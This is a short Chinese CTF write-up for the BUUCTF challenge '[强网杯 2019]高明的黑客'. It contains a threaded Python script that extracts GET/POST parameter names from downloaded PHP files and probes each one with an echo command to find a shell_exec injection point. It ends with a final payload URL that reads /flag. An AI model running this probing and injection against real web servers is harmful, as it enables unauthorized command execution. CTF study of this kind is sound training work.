    日期                 题目                     平台                 简介
2026/5/15        [强网杯 2019]高明的黑客          BUUCTF               根据页面提示下载源代码，下载的文件夹有很多php文件，并且这些php文件都可以直接在浏览器访问，
                                                                      所以思路是，读取这些文件，然后提取其中get和post请求的参数名，然后自动化找到某个文件的某个参数可以实现shell_exec(该参数)的方法
                                                                      自动化poc如下：
                                                                      （最终payload为http://1697881e-6c79-459a-adf2-01c0bd21416c.node5.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag）
                                                                                  import os
                                                                                  import requests
                                                                                  import threading
                                                                                  import time
                                                                                  import re
                                                                                  
                                                                                  URL_BUU = "http://1697881e-6c79-459a-adf2-01c0bd21416c.node5.buuoj.cn:81/"
                                                                                  file_path = r"C:\Users\luorui\Desktop\src"
                                                                                  os.chdir(file_path)
                                                                                  files_list = os.listdir(file_path)
                                                                                  session = requests.Session()
                                                                                  session.keep_alive = False
                                                                                  
                                                                                  def get_one_file(url,get_list,post_list):
                                                                                      for g in get_list:
                                                                                          response = session.get(url + "?" + g + "=echo woshidawang")
                                                                                          if response.status_code == 200:
                                                                                              print('1111111111111111111111111111111111111111111')
                                                                                              if "woshidawang" in response.text:
                                                                                                  print(f"有get参数{g}可以exec之类的")
                                                                                                  return
                                                                                          time.sleep(0.3)
                                                                                      for p in post_list:
                                                                                          response = session.post(url, data={p: "echo woshidawang"})
                                                                                          if response.status_code == 200:
                                                                                              print('2222222222222222222222222222222222222222222222')
                                                                                              if "woshidawang" in response.text:
                                                                                                  print(f"有post参数{p}可以exec之类的")
                                                                                                  return
                                                                                          time.sleep(0.3)
                                                                                  def get_request(file_name):
                                                                                      new_url = URL_BUU+file_name
                                                                                      with open(file_name, "r",encoding="UTF-8") as f:
                                                                                          content = f.read()
                                                                                          g_list = re.findall(r'\$_GET\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', content, re.IGNORECASE)
                                                                                          p_list = re.findall(r'\$_POST\s*\[\s*[\'"]([^\'"]+)[\'"]\s*\]', content, re.IGNORECASE)
                                                                                          params = {}
                                                                                          data = {}
                                                                                          for i in g_list:
                                                                                              params[i] = "echo woshidawang"
                                                                                          for i in p_list:
                                                                                              data[i] = "echo woshidawang"
                                                                                          response = session.post(new_url, data=data, params=params)
                                                                                          time.sleep(0.3)
                                                                                          if response.status_code == 200:
                                                                                              print('+'*10)
                                                                                              if "woshidawang" in response.text:
                                                                                                  print(f"{file_name}可以成功")
                                                                                                  get_one_file(new_url,g_list,p_list)
                                                                                                  os._exit(0)
                                                                                  
                                                                                  
                                                                                  if __name__ == '__main__':
                                                                                      threads = []
                                                                                      for file_name in files_list:
                                                                                          thread1 = threading.Thread(target=get_request, args=(file_name,),daemon=False)
                                                                                          threads.append(thread1)
                                                                                      for t in threads:
                                                                                          t.start()
                                                                                          time.sleep(0.5)
                                                                                      for t in threads:
                                                                                          t.join()   #等待完成
